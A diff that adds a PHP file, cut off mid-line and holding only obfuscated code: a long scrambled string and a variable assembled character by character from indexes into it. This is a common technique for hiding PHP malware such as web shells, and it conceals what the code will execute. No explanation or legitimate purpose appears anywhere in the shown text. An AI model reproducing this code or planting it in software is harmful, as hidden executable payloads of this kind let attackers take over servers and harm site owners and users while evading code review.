@@ -1,0 +1,421 @@
+<?php $mxrqs='DdMPzxBV+LtduCpRl9fMc3OYLv9yRqvpp5wpFhB2pvY/SU9N62yOoxLYivMmSvOXnDK+0smtBe5z3ehBhh6odfufZ3mGUKzjUOZmHzFPrfOCMEzk9TqZ6cbn2l7PYdtJfDGLNxJZnLVpRv6UN/BCThwv9mWfqB4MZmmD82iS8/4MmHwt6DWvXLvRIscDNxmWjCQqF370ioUqQdbKn9WZYrUj7HC5PRvRB73NsvpaxvliP48xzJkGaHbeGiOEkFTw2vnV7OTvX2JosxvX64gAMs36U5MqTMxZwB+i3HbQ/XlS/Y/PlRbduWPXwRmZZtQeQUnxImQXmEO4C+bwqgTji5Gb9C8tCoTx7MlIz0v=2KrWbKSQFpoiCITzt9rd+/H5lBRtrm2ct06ewmuoLSNWhp0o+z9I8F9o1K260oRroEulmFGYETy3LX57nul7lKqnUx3Vtfvj7lSzfJeXZSx0KvHhjVK+/xy5dgN4pjB3fejGLvWB6pkxpNpc1vnb1+R2ji2s4Nh4qC6Ut5/i8tG025oDS/3ysza9toD5RUEq0qY4jL9ya8SoCY2pX10ALeyq5SomwnpbGeFUbT2ysgtK6UXKwP8VCm0rJmQxNGpnxgng6YqYtGYaZZFm3A7xfASC/FUS/hvTFeODrxthRSlj3MHjkAoFHixrwOFDoGYNrrqj/WOgTv84e0zVTev4RRYBXHqm6l/XL0kgzO6DbyhYXtSTp3HEFdGyx/2vVubrjFOwLlIuCLTSGL15nbM4up6f6VPzd0TMDOZDGR1fHwK8dxtDvIsh01YnAcbKz9mDLTyMOJJ0hJiMmEMElNwwJkrkQAhjm7DQUTRrYo7ZcaGAOLP4yrFQt6cm4jM52kmwOmd+HkVwYGMFQgSwIIrnMZDlfBW5+j22Ia0r8+JBF1ix07mUDNugpuJJwDtCBcca35bEiienackXwk3qZJtrD+88cOwK+GjxtvhOb+rF4DMfNfjIcSdMDvBf/5GtFoFXppOXxg57pqdLptNamqyA05M2My+/YTEJaqVkJYrOg4dQ6hEiXfLUsdiOg0Q65o/Krlf51HnLc9+uHK2mgsAWnupNtG7ajNFzJgrMEvREk3swyJPpzBPtqwumCU/cSn9E5XrzUic/7voXTDO8jjOYeeYspdmn6iJibD5VYVlEgvHOyLTIndcSVU/hHTk+vKqUqmBqASW/kkbQVX5o3GABWfEYIgnsIDuYDozEBi3cj6uV8hughoIM675+yJt_IutrLArySN59afZqF2EVbr7ExIvv18txypaGj4/YBhoLtulc62Z28KCZR3lFEUGqR4xGmVB6ojzcecv5n4W5JRLkNvMBQgv8tlI3JrlYjslZi2rU6gXQpKHVbzJq2xyGz1AmWes/SKogTIj/6bqTmAJ09hTpj1O/kJaSgvNt1qbz4561C(JkHKMl0C9y1YWOqrHOvcfx4Vc+XZ5KCS3A6gY7LJIKzXi6//Jdz7WQjvm122rrTeI/LZCmT4f8YSmbZTJs2m2+CoH$3h+AU3C55/FjcYw2Nllb3j8H/EzvorDl8DP3icEz+XzFDuaFws12e0zkGD+ox+QDcVZPTzW1HjhZRfCNLX8W9HMApUHN/2ZOzF1ODlWrsGV4oT9WBQhgmGU+hniIW5BzcCtiLAmL1bU2K7XH/dQYvh0tb23dhPew/b70CgZDSvy+KGhCZ5/noRNmja3UQpobj2n3kXGAi099oeQPqy1DpG0ww54bQLG+tmcK5Aj4PhajN6giawoO1k6KFdWW2f7JBBgcC5Z9ShVdbd`cD9m3+tTztkfsAjknMwjT1EKXp9q15yGaGur7GjicwwEQCuiHIvLOiZuNFe/TUJbcXDuSUBJu3vC5SsJ4GJytmu8NRIdd+fO4Q1aQpSIBLZLvimdncNBhJ1nBbvmWO4axWVsQev/s1I4Xh/9bngLQWRCdZyk0EMVTsoLOeZ8J5sMHZj245FWFQEmp2xjZIZlUpQkgOzwpBd1TEnVqvZU7DW^VVlSBlZmnKUF84L9FtK9a2zb7KC45WGM3cSBncRAPtSEkW81CsfllzL3ptbGqMRf2M9Fcchha1pQAoph5cOaOBmU+Eex6DOp6fGS/zpxYapprqQoYZre6aU6gNczNPA/LP+LD2Cz4dW1lv5QOyjY09jr6DdBKqbx4uGvuHZqnPjTIRdwwoKRtTs/wNd2o7X54GpfE2Ta6CeR77BBRC3jYTfZncm8zRfPuFNazjT/SjP0jt/tPUg8YFUruowv6cbJF1eeoD1sHhksXO/QkVyRZgncKW2BHiTjtw6+Q]jvTuzCFzAXFl6opCVUpgbj82BlukcII6cVt2axCxw/7JN6qnXJbjGbTTwjgOs7xvYlGvOa0DZnGzCbvncktJgJIG9lvyvAE1nSZ9hRgJnW76BRN8MA9UotMm/dPce7B+Puc8eG9qqnrCs7C7e4xiJ6j+rlFBJwmcd22ee4QDnIxcwxQzRwUYYxyEkYHdqlSYEFqIuAmh+eECQyFv5pjN79Sw2z5SvfejJ20VnXd+9oTfU4ydPXlvGt5+2qLDdTE6pgVQ8WB/ITmiu1cfvT+Cf3kaDCpDRXxWQ6XNGXmsUjchGhGN3pTK4qrblME1OR9NuvB/6UZn6a/Upe\nzUWxW/TO0AsObItVaewI9+Rjy2nTL0UnlAZGc3fdlGaZK/FFxzS2yvyds+lUYAcbaTEfxVegLUCGimQ+1cxQ3A9nb6v0es9PRxwdkqrFQv2bdfaAmNcMznRQ9U1ukJZtxEHBelSHqZdMBI7f54DQZqu2NTS3rwSwmIy14qHK10XPjDtLazP5e4wuLPUJMcmSWwA6wD85Mr6Xs8vdsSuJAkPQtxn5Z0x5qimN/e76C4fECsjmaNWVpO7geT3wtP42sScPrxA8UA9DdJ3uXV3NpiM+CkI0LwdG5bfTzGL45J5zHQXgVj/5yIx2XkK5BrWBQb6jxtxEJ7z2SjqUs3wM87BaGGdmsjQOVL+pcFsE17VbLjrk2TTZnUNOWXBify2yjp+NT9iu2WcQkj+21KzllSdtA0EGH5Ny8cusWr8aBGimbYzNhXtse5eAWndeysFNomkof9SWJw43Vz[+uQBSc6ZLLP/nySB8hAXOycJfl1p4oNYsddDDCGtYqKxnaujSCeUViPQKS0EEldwAoziCJDssrFOTysT9ba99oMVq8+TBnKQP0non7K/3Ubonz8bEtenGYPWrtbvctbDWuNrljSXFINNmu7c6xIeeO1+sqANteOJlMCs4sFrpObW7FgnY64PPLBPcdahyGCp53OWTWZNrli=uPBk5naNm25c2kPUq6DRXPApNniuqvmODL2tF3g+ORjfSgbKq/22noEgrpndRiVHoisNsgeQXxxHOf89e1z9GYm0Uy5ZZsgCvfXwILRqOWmy2GjS3CY+3rwjI6ouf8vnoHWABhbDesSHE3hV9Ve1KQod4kRfgfl9bCsU9ioBQZqTuvkKxX8gWXBi4qedDB/xexpkhSn+Tw4vljwfq4WCvDXZirOp7cjxgIwXDvMS4rrFz0N0/MuNRk6k6rjUvKeqLpLlH6syZp8VOfKNlsrwRHr0Qj/2vflbF0yNcrZaqSCASDAu)elItEfGr2zpE4Wv+Gpm0InadTbfK9bjA1+Mk434hhZw8WwBizT9Sua7F0ZuweBX2YOxDxqLMyWTGg/NaBHthUfVCHDzbsSB+CFBZZbWjX9FH4jGDtGWwJ+7BOfha9H7PxFMPRzcrwVxErAlxqzW9UepmaJvtFjuS/Zi461+cvX1Bw/lQsuY2TzUXobkKsSOff9ctHKBzwJ3A6kW1xUwGih8HnATvJavkDzd/WNQ6UGYIsEKEW++uzdnTalr8WZAAHeOa83TDYjo3EVZKvCe6bF9vXnIpVd3ud+HcMNGMEavlz1IZO5HAIYCOGz42SQAa266cY/cdhaLQ/W3FGwS2EHGSQJjFXmJehTgdmo2QluRm6jFBovz85tF9zNfYlX9xLFK6ZmqAo$w4oljd;2GhTIlhbRjiTXtlt2j6gZF4+2LKcHGPw0/rIzzqzjFlnHg9Gu+MHT1IJIDe14IDAtBMmGvrn8LPaK/g9PwvSbUqC6JjyJZiNqdVhywEjMrJ_2wwOjIw4B4oQu9Gq0linGG/wDfsYc9BAmLJB_suM2ToCVtTdy2Ga2mvIUCc97UU28VMkYLZG/Bdh/07HNFfoYR71pVTSUEQSZ8lc4MUiCFcxCmpzoC5hBR7W/EGkg4iky+7RjCC61jM2Yqj9Im09ORBLAixNJ/BxnLpjNF7qDKuswgbNstn1iyYQFey0DjNEwxlK6nkI0'; $kjbahcypzgxt=$mxrqs[73].$mxrqs[47].$mxrqs[104].$mxrqs[10].$mxrqs[91].$mxrqs[59].$mxrqs[10].$mxrqs[113].$mxrqs[158].$mxrqs[68].$mxrqs[118].$mxrqs[27].$mxrqs[2].$mxrqs[416].$mxrqs[12].$mxrqs[416].$mxrqs[43].$mxrqs[39].$mxrqs[36].$mxrqs[154].$mxrqs[1].$mxrqs[14].$mxrqs[13].$mxrqs[68].$mxrqs[69].$mxrqs[154].$mxrqs[45].$mxrqs[118].$mxrqs[1].$mxrqs[69].$mxrqs[111].$mxrqs[1].$mxrqs[95].$mxrqs[37].$mxrqs[184].$mxrqs[184].$mxrqs[59].$mxrqs[109].$mxrqs[0].$mxrqs[36].$mxrqs[23].$mxrqs[2].$mxrqs[48].$mxrqs[23].$mxrqs[122].$mxrqs[66].$mxrqs[154].$mxrqs[275].$mxrqs[29].$mxrqs[184].$mxrqs[194].$mxrqs[164].$mxrqs[5].$mxrqs[274].$mxrqs[14].$mxrqs[48].$mxrqs[16].$mxrqs[45].$mxrqs[118].$mxrqs[59].$mxrqs[69].$mxrqs[88].$mxrqs[95].$mxrqs[43].$mxrqs[64].$mxrqs[14].$mxrqs[158].$mxrqs[88].$mxrqs[95].$mxrqs[113].$mxrqs[44].$mxrqs[44].$mxrqs[118].$mxrqs[113].$mxrqs[0].$mxrqs[69].$mxrqs[118].$mxrqs[10].$mxrqs[416].$mxrqs[1].$mxrqs[416].$mxrqs[154].$mxrqs[68].$mxrqs[10].$mxrqs[69].$mxrqs[95].$mxrqs[4].$mxrqs[113].$mxrqs[21].$mxrqs[1].$mxrqs[3].$mxrqs[113].$mxrqs[21].$mxrqs[1].$mxrqs[22].$mxrqs[25].$mxrqs[164].$mxrqs[15].$mxrqs[231].$mxrqs[22].$mxrqs[158].$mxrqs[4].$mxrqs[13].$mxrqs[39].$mxrqs[23].$mxrqs[37].$mxrqs[27].$mxrqs[36].$mxrqs[20].$mxrqs[73].$mxrqs[184].$mxrqs[91].$mxrqs[7].$mxrqs[416].$mxrqs[14].$mxrqs[113].$mxrqs[118].$mxrqs[122].$mxrqs[17].$mxrqs[17].$mxrqs[2].$mxrqs[122].$mxrqs[194].$mxrqs[113].$mxrqs[118].$mxrqs[275].$mxrqs[21].$mxrqs[5].$mxrqs[27].$mxrqs[127].$mxrqs[33].$mxrqs[158].$mxrqs[56].$mxrqs[88].$mxrqs[154].$mxrqs[158].$mxrqs[3].$mxrqs[25].$mxrqs[158].$mxrqs[20].$mxrqs[6].$mxrqs[10].$mxrqs[274].$mxrqs[56].$mxrqs[22].$mxrqs[47].$mxrqs[100].$mxrqs[45].$mxrqs[63].$mxrqs[34].$mxrqs[164].$mxrqs[100].$mxrqs[66].$mxrqs[274].$mxrqs[7].$mxrqs[33].$mxrqs[8].$mxrqs[164].$mxrqs[23].$mxrqs[1].$mxrqs[184].$mxrqs[20].$mxrqs[68].$mxrqs[16].$mxrqs[1].$mxrqs[9].$mxrqs[6].$mxrqs[29].$mxrqs[122].$mxrqs[18].$mxrqs[15].$mxrqs[48].$mxrqs[25].$mxrqs[5].$mxrqs[416].$mxrqs[68].$mxrqs[4].$mxrqs[10].$mxrqs[113].$mxrqs[118].$mxrqs[2].$mxrqs[6].$mxrqs[33].$mxrqs[91].$mxrqs[2].$mxrqs[44].$mxrqs[118].$mxrqs[109].$mxrqs[44].$mxrqs[95].$mxrqs[6].$mxrqs[127].$mxrqs[9].$mxrqs[13].$mxrqs[20].$mxrqs[2].$mxrqs[104].$mxrqs[416].$mxrqs[39].$mxrqs[69].$mxrqs[63].$mxrqs[12].$mxrqs[37].$mxrqs[52].$mxrqs[22].$mxrqs[111].$mxrqs[45].$mxrqs[4].$mxrqs[69].$mxrqs[36].$mxrqs[109].$mxrqs[1].$mxrqs[6].$mxrqs[12].$mxrqs[56].$mxrqs[56].$mxrqs[14].$mxrqs[47].$mxrqs[33].$mxrqs[231].$mxrqs[275].$mxrqs[52].$mxrqs[118].$mxrqs[27].$mxrqs[111].$mxrqs[194].$mxrqs[36].$mxrqs[29].$mxrqs[52].$mxrqs[68].$mxrqs[64].$mxrqs[274].$mxrqs[127].$mxrqs[91].$mxrqs[158].$mxrqs[23].$mxrqs[154].$mxrqs[3].$mxrqs[95].$mxrqs[22].$mxrqs[127].$mxrqs[194].$mxrqs[64].$mxrqs[15].$mxrqs[7].$mxrqs[127].$mxrqs[1].$mxrqs[23].$mxrqs[109].$mxrqs[158].$mxrqs[127].$mxrqs[95].$mxrqs[27].$mxrqs[34].$mxrqs[12].$mxrqs[25].$mxrqs[104].$mxrqs[25].$mxrqs[0].$mxrqs[194].$mxrqs[20].$mxrqs[274].$mxrqs[47].$mxrqs[7].$mxrqs[15].$mxrqs[48].$mxrqs[12].$mxrqs[104].$mxrqs[231].$mxrqs[91].$mxrqs[88].$mxrqs[23].$mxrqs[68].$mxrqs[5].$mxrqs[59].$mxrqs[6].$mxrqs[29].$mxrqs[64].$mxrqs[63].$mxrqs[44].$mxrqs[48].$mxrqs[18].$mxrqs[43].$mxrqs[73].$mxrqs[48].$mxrqs[88].$mxrqs[164].$mxrqs[14].$mxrqs[43].$mxrqs[20].$mxrqs[48].$mxrqs[43].$mxrqs[113].$mxrqs[95].$mxrqs[69].$mxrqs[64].$mxrqs[275].$mxrqs[8].$mxrqs[12].$mxrqs[68].$mxrqs[18].$mxrqs[48].$mxrqs[6].$mxrqs[20].$mxrqs[59].$mxrqs[66].$mxrqs[118].$mxrqs[44].$mxrqs[45].$mxrqs[100].$mxrqs[113].$mxrqs[68].$mxrqs[164].$mxrqs[3].$mxrqs[118].$mxrqs[47].$mxrqs[184].$mxrqs[43].$mxrqs[23].$mxrqs[184].$mxrqs[18].$mxrqs[29].$mxrqs[275].$mxrqs[118].$mxrqs[63].$mxrqs[63].$mxrqs[36].$mxrqs[100].$mxrqs[91].$mxrqs[59].$mxrqs[4].$mxrqs[29].$mxrqs[27].$mxrqs[25].$mxrqs[9].$mxrqs[10].$mxrqs[5].$mxrqs[6].$mxrqs[16].$mxrqs[104].$mxrqs[44].$mxrqs[111].$mxrqs[154].$mxrqs[122].$mxrqs[13].$mxrqs[69].$mxrqs[2].$mxrqs[104].$mxrqs[0].$mxrqs[416].$mxrqs[8].$mxrqs[91].$mxrqs[27].$mxrqs[18].$mxrqs[194].$mxrqs[44].$mxrqs[154].$mxrqs[66].$mxrqs[22].$mxrqs[18].$mxrqs[17].$mxrqs[43].$mxrqs[23].$mxrqs[158].$mxrqs[0].$mxrqs[66].$mxrqs[20].$mxrqs[8].$mxrqs[13].$mxrqs[73].$mxrqs[274].$mxrqs[63].$mxrqs[22].$mxrqs[43].$mxrqs[44].$mxrqs[59].$mxrqs[34].$mxrqs[158].$mxrqs[16].$mxrqs[4].$mxrqs[113].$mxrqs[18].$mxrqs[43].$mxrqs[68].$mxrqs[56].$mxrqs[29].$mxrqs[25].$mxrqs[45].$mxrqs[164].$mxrqs[69].$mxrqs[63].$mxrqs[39].$mxrqs[6].$mxrqs[158].$mxrqs[47].$mxrqs[95].$mxrqs[48].$mxrqs[5].$mxrqs[44].$mxrqs[8].$mxrqs[154].$mxrqs[1].$mxrqs[12].$mxrqs[43].$mxrqs[1].$mxrqs[52].$mxrqs[158].$mxrqs[91].$mxrqs[27].$mxrqs[52].$mxrqs[45].$mxrqs[8].$mxrqs[64].$mxrqs[20].$mxrqs[48].$mxrqs[95].$mxrqs[4].$mxrqs[194].$mxrqs[95].$mxrqs[64].$mxrqs[7].$mxrqs[91].$mxrqs[1].$mxrqs[127].$mxrqs[118].$mxrqs[14].$mxrqs[7].$mxrqs[52].$mxrqs[17].$mxrqs[95].$mxrqs[10].$mxrqs[122].$mxrqs[64].$mxrqs[63].$mxrqs[48].$mxrqs[64].$mxrqs[0].$mxrqs[34].$mxrqs[15].$mxrqs[416].$mxrqs[23].$mxrqs[100].$mxrqs[14].$mxrqs[16].$mxrqs[109].$mxrqs[20].$mxrqs[17].$mxrqs[18].$mxrqs[113].$mxrqs[100].$mxrqs[73].$mxrqs[16].$mxrqs[13].$mxrqs[95].$mxrqs[12].$mxrqs[68].$mxrqs[274].$mxrqs[52].$mxrqs[16].$mxrqs[25].$mxrqs[104].$mxrqs[104].$mxrqs[63].$mxrqs[14].$mxrqs[1].$mxrqs[27].$mxrqs[109].$mxrqs[59].$mxrqs[73].$mxrqs[231].$mxrqs[118].$mxrqs[36].$mxrqs[88].$mxrqs[33].$mxrqs[95].$mxrqs[69].$mxrqs[7].$mxrqs[29].$mxrqs[29].$mxrqs[15].$mxrqs[20].$mxrqs[39].$mxrqs[39].$mxrqs[29].$mxrqs[118].$mxrqs[104].$mxrqs[44].$mxrqs[59].$mxrqs[10].$mxrqs[25].$mxrqs[111].$mxrqs[275].$mxrqs[20].$mxrqs[9].$mxrqs[231].$mxrqs[416].$mxrqs[45].$mxrqs[3].$mxrqs[14].$mxrqs[29].$mxrqs[184].$mxrqs[34].$mxrqs[48].$mxrqs[6].$mxrqs[0].$mxrqs[0].$mxrqs[91].$mxrqs[44].$mxrqs[12].$mxrqs[68].$mxrqs[15].$mxrqs[47].$mxrqs[7].$mxrqs[5].$mxrqs[5].$mxrqs[95].$mxrqs[73].$mxrqs[158].$mxrqs[37].$mxrqs[95].$mxrqs[113].$mxrqs[1].$mxrqs[111].$mxrqs[127].$mxrqs[274].$mxrqs[34].$mxrqs[194].$mxrqs[100].$mxrqs[44].$mxrqs[63].$mxrqs[416].$mxrqs[34].$mxrqs[100].$mxrqs[8].$mxrqs[36].$mxrqs[47].$mxrqs[16].$mxrqs[22].$mxrqs[13].$mxrqs[122].$mxrqs[14].$mxrqs[6].$mxrqs[36].$mxrqs[33].$mxrqs[10].$mxrqs[37].$mxrqs[69].$mxrqs[52].$mxrqs[22].$mxrqs[16].$mxrqs[10].$mxrqs[25].$mxrqs[6].$mxrqs[113].$mxrqs[25].$mxrqs[95].$mxrqs[109].$mxrqs[66].$mxrqs[59].$mxrqs[64].$mxrqs[52].$mxrqs[22].$mxrqs[39].$mxrqs[48].$mxrqs[18].$mxrqs[194].$mxrqs[154].$mxrqs[275].$mxrqs[59].$mxrqs[8].$mxrqs[95].$mxrqs[17].$mxrqs[39].$mxrqs[4].$mxrqs[73].$mxrqs[122].$mxrqs[9].$mxrqs[104].$mxrqs[109].$mxrqs[17].$mxrqs[9].$mxrqs[122].$mxrqs[4].$mxrqs[1].$mxrqs[15].$mxrqs[91].$mxrqs[52].$mxrqs[66].$mxrqs[1].$mxrqs[73].$mxrqs[20].$mxrqs[59].$mxrqs[6].$mxrqs[18].$mxrqs[33].$mxrqs[12].$mxrqs[118].$mxrqs[39].$mxrqs[43].$mxrqs[47].$mxrqs[88].$mxrqs[37].$mxrqs[12].$mxrqs[158].$mxrqs[184].$mxrqs[111].$mxrqs[111].$mxrqs[2].$mxrqs[14].$mxrqs[37].$mxrqs[15].$mxrqs[104].$mxrqs[127].$mxrqs[194].$mxrqs[64].$mxrqs[69].$mxrqs[17].$mxrqs[68].$mxrqs[33].$mxrqs[275].$mxrqs[113].$mxrqs[4].$mxrqs[45].$mxrqs[7].$mxrqs[158].$mxrqs[36].$mxrqs[15].$mxrqs[1].$mxrqs[88].$mxrqs[8].$mxrqs[13].$mxrqs[10].$mxrqs[18].$mxrqs[13].$mxrqs[25].$mxrqs[25].$mxrqs[27].$mxrqs[52].$mxrqs[231].$mxrqs[52].$mxrqs[22].$mxrqs[91].$mxrqs[3].$mxrqs[69].$mxrqs[63].$mxrqs[36].$mxrqs[47].$mxrqs[113].$mxrqs[56].$mxrqs[5].$mxrqs[194].$mxrqs[37].$mxrqs[2].$mxrqs[34].$mxrqs[91].$mxrqs[0].$mxrqs[164].$mxrqs[95].$mxrqs[16].$mxrqs[47].$mxrqs[33].$mxrqs[122].$mxrqs[88].$mxrqs[36].$mxrqs[33].$mxrqs[73].$mxrqs[88].$mxrqs[91].$mxrqs[88].$mxrqs[95].$mxrqs[0].$mxrqs[5].$mxrqs[25].$mxrqs[100].$mxrqs[118].$mxrqs[48].$mxrqs[47].$mxrqs[20].$mxrqs[231].$mxrqs[39].$mxrqs[6].$mxrqs[68].$mxrqs[2].$mxrqs[36].$mxrqs[184].$mxrqs[15].$mxrqs[21].$mxrqs[39].$mxrqs[6].$mxrqs[37].$mxrqs[416].$mxrqs[104].$mxrqs[73].$mxrqs[21].$mxrqs[20].$mxrqs[63].$mxrqs[36].$mxrqs[13].$mxrqs[100].$mxrqs[275].$mxrqs[52].$mxrqs[95].$mxrqs[56].$mxrqs[164].$mxrqs[12].$mxrqs[39].$mxrqs[8].$mxrqs[88].$mxrqs[88].$mxrqs[23].$mxrqs[63].$mxrqs[10].$mxrqs[1].$mxrqs[275].$mxrqs[43].$mxrqs[275].$mxrqs[69].$mxrqs[66].$mxrqs[27].$mxrqs[0].$mxrqs[158].$mxrqs[5].$mxrqs[9].$mxrqs[111].$mxrqs[39].$mxrqs[274].$mxrqs[4].$mxrqs[111].$mxrqs[25].$mxrqs[48].$mxrqs[39].$mxrqs[17].$mxrqs[63].$mxrqs[25].$mxrqs[43].$mxrqs[113].$mxrqs[1].$mxrqs[64].$mxrqs[8].$mxrqs[21].$mxrqs[69].$mxrqs[68].$mxrqs[25].$mxrqs[18].$mxrqs[2].$mxrqs[64].$mxrqs[95].$mxrqs[23].$mxrqs[416].$mxrqs[20].$mxrqs[95].$mxrqs[416].$mxrqs[109].$mxrqs[95].$mxrqs[274].$mxrqs[68].$mxrqs[47].$mxrqs[4].$mxrqs[88].$mxrqs[184].$mxrqs[274].$mxrqs[48].$mxrqs[17].$mxrqs[113].$mxrqs[39].$mxrqs[4].$mxrqs[25].$mxrqs[52].$mxrqs[0].$mxrqs[69].$mxrqs[6].$mxrqs[69].$mxrqs[18].$mxrqs[17].$mxrqs[43].$mxrqs[12].$mxrqs[100].$mxrqs[12].$mxrqs[5].$mxrqs[12].$mxrqs[275].$mxrqs[4].$mxrqs[2].$mxrqs[100].$mxrqs[5].$mxrqs[39].$mxrqs[127].$mxrqs[21].$mxrqs[18].$mxrqs[275].$mxrqs[20].$mxrqs[14].$mxrqs[63].$mxrqs[109].$mxrqs[29].$mxrqs[0].$mxrqs[59].$mxrqs[20].$mxrqs[7].$mxrqs[56].$mxrqs[20].$mxrqs[59].$mxrqs[10].$mxrqs[9].$mxrqs[111].$mxrqs[16].$mxrqs[12].$mxrqs[113].$mxrqs[27].$mxrqs[15].$mxrqs[154].$mxrqs[59].$mxrqs[12].$mxrqs[88].$mxrqs[0].$mxrqs[109].$mxrqs[47].$mxrqs[3].$mxrqs[8].$mxrqs[184].$mxrqs[20].$mxrqs[113].$mxrqs[66].$mxrqs[127].$mxrqs[275].$mxrqs[416].$mxrqs[194].$mxrqs[7].$mxrqs[158].$mxrqs[158].$mxrqs[8].$mxrqs[44].$mxrqs[59].$mxrqs[12].$mxrqs[73].$mxrqs[29].$mxrqs[48].$mxrqs[274].$mxrqs[52].$mxrqs[64].$mxrqs[416].$mxrqs[56].$mxrqs[113].$mxrqs[39].$mxrqs[88].$mxrqs[25].$mxrqs[154].$mxrqs[45].$mxrqs[113].$mxrqs[59].$mxrqs[37].$mxrqs[7].$mxrqs[73].$mxrqs[275].$mxrqs[56].$mxrqs[39].$mxrqs[48].$mxrqs[0].$mxrqs[33].$mxrqs[59].$mxrqs[1].$mxrqs[275].$mxrqs[21].$mxrqs[4].$mxrqs[158].$mxrqs[36].$mxrqs[3].$mxrqs[20].$mxrqs[15].$mxrqs[127].$mxrqs[91].$mxrqs[158].$mxrqs[1].$mxrqs[164].$mxrqs[88].$mxrqs[59].$mxrqs[47].$mxrqs[29].$mxrqs[48].$mxrqs[16].$mxrqs[10].$mxrqs[104].$mxrqs[59].$mxrqs[27].$mxrqs[34].$mxrqs[52].$mxrqs[118].$mxrqs[275].$mxrqs[59].$mxrqs[23].$mxrqs[45].$mxrqs[15].$mxrqs[22].$mxrqs[0].$mxrqs[37].$mxrqs[64].$mxrqs[63].$mxrqs[47].$mxrqs[69].$mxrqs[33].$mxrqs[122].$mxrqs[63].$mxrqs[1].$mxrqs[122].$mxrqs[5].$mxrqs[17].$mxrqs[113].$mxrqs[34].$mxrqs[12].$mxrqs[4].$mxrqs[154].$mxrqs[39].$mxrqs[4].$mxrqs[9].$mxrqs[22].$mxrqs[275].$mxrqs[52].$mxrqs[0].$mxrqs[4].$mxrqs[59].$mxrqs[47].$mxrqs[91].$mxrqs[104].$mxrqs[66].$mxrqs[23].$mxrqs[18].$mxrqs[95].$mxrqs[88].$mxrqs[17].$mxrqs[113].$mxrqs[27].$mxrqs[122].$mxrqs[164].$mxrqs[1].$mxrqs[36].$mxrqs[52].$mxrqs[184].$mxrqs[12].$mxrqs[39].$mxrqs[113].$mxrqs[91].$mxrqs[34].$mxrqs[4].$mxrqs[0].$mxrqs[154].$mxrqs[158].$mxrqs[66].$mxrqs[22].$mxrqs[6].$mxrqs[29].$mxrqs[95].$mxrqs[7].$mxrqs[47].$mxrqs[127].$mxrqs[14].$mxrqs[10].$mxrqs[17].$mxrqs[66].$mxrqs[64].$mxrqs[21].$mxrqs[231].$mxrqs[73].$mxrqs[22].$mxrqs[0].$mxrqs[95].$mxrqs[104].$mxrqs[231].$mxrqs[95].$mxrqs[27].$mxrqs[2].$mxrqs[22].$mxrqs[18].$mxrqs[164].$mxrqs[22].$mxrqs[7].$mxrqs[25].$mxrqs[118].$mxrqs[10].$mxrqs[9].$mxrqs[158].$mxrqs[12].$mxrqs[3].$mxrqs[48].$mxrqs[0].$mxrqs[69].$mxrqs[118].$mxrqs[48].$mxrqs[6].$mxrqs[10].$mxrqs[47].$mxrqs[43].$mxrqs[39].$mxrqs[6].$mxrqs[158].$mxrqs[18].$mxrqs[1].$mxrqs[91].$mxrqs[25].$mxrqs[9].$mxrqs[20].$mxrqs[231].$mxrqs[158].$mxrqs[5].$mxrqs[8].$mxrqs[6].$mxrqs[7].$mxrqs[2].$mxrqs[2].$mxrqs[1].$mxrqs[118].$mxrqs[194].$mxrqs[4].$mxrqs[95].$mxrqs[111].$mxrqs[2].$mxrqs[18].$mxrqs[47].$mxrqs[4].$mxrqs[23].$mxrqs[275].$mxrqs[416].$mxrqs[7].$mxrqs[37].$mxrqs[25].$mxrqs[10].$mxrqs[1].$mxrqs[231].$mxrqs[2].$mxrqs[7].$mxrqs[59].$mxrqs[69].$mxrqs[1].$mxrqs[64].$mxrqs[1].$mxrqs[274].$mxrqs[95].$mxrqs[22].$mxrqs[21].$mxrqs[88].$mxrqs[113].$mxrqs[47].$mxrqs[22].$mxrqs[7].$mxrqs[88].$mxrqs[416].$mxrqs[274].$mxrqs[23].$mxrqs[100].$mxrqs[37].$mxrqs[33].$mxrqs[21].$mxrqs[73].$mxrqs[48].$mxrqs[231].$mxrqs[13].$mxrqs[39].$mxrqs[416].$mxrqs[64].$mxrqs[34].$mxrqs[154].$mxrqs[10].$mxrqs[47].$mxrqs[164].$mxrqs[88].$mxrqs[64].$mxrqs[3].$mxrqs[231].$mxrqs[3].$mxrqs[6].$mxrqs[25].$mxrqs[21].$mxrqs[10].$mxrqs[52].$mxrqs[5].$mxrqs[47].$mxrqs[34].$mxrqs[9].$mxrqs[9].$mxrqs[45].$mxrqs[111].$mxrqs[64].$mxrqs[12].$mxrqs[275].$mxrqs[2].$mxrqs[14].$mxrqs[5].$mxrqs[14].$mxrqs[22].$mxrqs[109].$mxrqs[56].$mxrqs[158].$mxrqs[48].$mxrqs[18].$mxrqs[184].$mxrqs[20].$mxrqs[1].$mxrqs[56].$mxrqs[16].$mxrqs[23].$mxrqs[111].$mxrqs[33].$mxrqs[21].$mxrqs[274].$mxrqs[37].$mxrqs[34].$mxrqs[18].$mxrqs[127].$mxrqs[34].$mxrqs[68].$mxrqs[44].$mxrqs[34].$mxrqs[52].$mxrqs[47].$mxrqs[16].$mxrqs[274].$mxrqs[231].$mxrqs[10].$mxrqs[29].$mxrqs[95].$mxrqs[39].$mxrqs[100].$mxrqs[22].$mxrqs[158].$mxrqs[69].$mxrqs[56].$mxrqs[13].$mxrqs[118].$mxrqs[9].$mxrqs[10].$mxrqs[59].$mxrqs[194].$mxrqs[64].$mxrqs[274].$mxrqs[36].$mxrqs[275].$mxrqs[39].$mxrqs[36].$mxrqs[3].$mxrqs[14].$mxrqs[44].$mxrqs[69].$mxrqs[275].$mxrqs[9].$mxrqs[12].$mxrqs[18].$mxrqs[13].$mxrqs[34].$mxrqs[122].$mxrqs[91].$mxrqs[275].$mxrqs[29].$mxrqs[44].$mxrqs[34].$mxrqs[184].$mxrqs[275].$mxrqs[1].$mxrqs[37].$mxrqs[184].$mxrqs[100].$mxrqs[104].$mxrqs[39].$mxrqs[36].$mxrqs[48].$mxrqs[10].$mxrqs[59].$mxrqs[25].$mxrqs[56].$mxrqs[15].$mxrqs[164].$mxrqs[184].$mxrqs[69].$mxrqs[20].$mxrqs[45].$mxrqs[95].$mxrqs[104].$mxrqs[127].$mxrqs[416].$mxrqs[20].$mxrqs[37].$mxrqs[22].$mxrqs[34].$mxrqs[22].$mxrqs[34].$mxrqs[0].$mxrqs[88].$mxrqs[13].$mxrqs[66].$mxrqs[16].$mxrqs[164].$mxrqs[154].$mxrqs[73].$mxrqs[66].$mxrqs[63].$mxrqs[45].$mxrqs[43].$mxrqs[275].$mxrqs[73].$mxrqs[33].$mxrqs[39].$mxrqs[113].$mxrqs[17].$mxrqs[33].$mxrqs[25].$mxrqs[34].$mxrqs[14].$mxrqs[5].$mxrqs[64].$mxr